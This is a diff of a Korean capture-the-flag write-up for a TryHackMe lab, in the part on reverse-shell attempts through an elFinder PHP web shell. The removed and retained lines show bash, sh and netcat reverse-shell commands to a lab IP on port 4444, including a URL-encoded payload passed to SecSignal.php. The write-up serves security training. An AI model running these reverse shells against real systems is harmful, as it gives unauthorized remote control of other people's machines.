@@ -455,20 +455,6 @@ http://files.lookup.thm/elFinder/php
 
 ---
 
-### 2. 우회 방법: 명령어를 여러 개로 나누거나 `bash`를 명시적으로 호출
-
-```bash
-# 실패
-/bin/bash -c "bash -i >& /dev/tcp/10.8.136.212/4444 0>&1"
-```
-
-URL 인코딩:
-
-```bash
-# 성공
-/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
-```
-
 접속 URL:
 
 ```
@@ -478,19 +464,6 @@ http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E
 ---
 
 ### 3. `bash` 가 없으면 `sh` 로 시도하기
-
-```
-/bin/sh -c "sh -i >& /dev/tcp/10.8.136.212/4444 0>&1"
-```
-
----
-
-### 4. `nc` 리버스 쉘도 시도하기 (nc가 설치되어 있으면)
-
-```bash
-# 실패
-nc 10.8.136.212 4444 -e /bin/sh
-```
 
 URL 인코딩
 
